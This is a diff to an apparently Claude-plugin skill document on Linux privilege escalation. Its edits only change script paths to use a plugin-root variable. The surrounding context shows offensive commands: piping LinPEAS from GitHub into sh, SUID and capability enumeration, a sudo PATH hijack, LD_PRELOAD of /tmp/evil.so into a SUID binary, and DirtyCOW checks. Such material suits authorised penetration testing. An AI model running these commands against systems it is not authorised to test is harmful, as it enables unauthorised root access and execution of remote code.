@@ -14,7 +14,7 @@ Provides systematic approaches for escalating privileges on Linux systems from l
 ### Enumeration Scripts
 ```bash
 # Run comprehensive enumeration
-scripts/linux-privesc-check.sh
+${CLAUDE_PLUGIN_ROOT}/skills/linux-privesc/scripts/linux-privesc-check.sh
 
 # LinPEAS - Most comprehensive
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
@@ -135,7 +135,7 @@ sudo PATH=/tmp:$PATH ls
 # Find SUID binaries
 find / -perm -4000 -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
-scripts/suid-finder.sh
+${CLAUDE_PLUGIN_ROOT}/skills/linux-privesc/scripts/suid-finder.sh
 
 # Find SGID binaries
 find / -perm -2000 -type f 2>/dev/null
@@ -209,7 +209,7 @@ LD_PRELOAD=/tmp/evil.so ./suid_binary
 ```bash
 # Find files with capabilities
 getcap -r / 2>/dev/null
-scripts/capability-checker.py
+${CLAUDE_PLUGIN_ROOT}/skills/linux-privesc/scripts/capability-checker.py
 
 # Check current process capabilities
 capsh --print
@@ -296,7 +296,7 @@ uname -m
 ### Kernel Exploit Detection
 ```bash
 # Run kernel exploit suggester
-scripts/kernel-exploit-suggester.sh
+${CLAUDE_PLUGIN_ROOT}/skills/linux-privesc/scripts/kernel-exploit-suggester.sh
 
 # Check for specific vulnerabilities
 # DirtyCOW (CVE-2016-5195) - Linux < 4.8.3
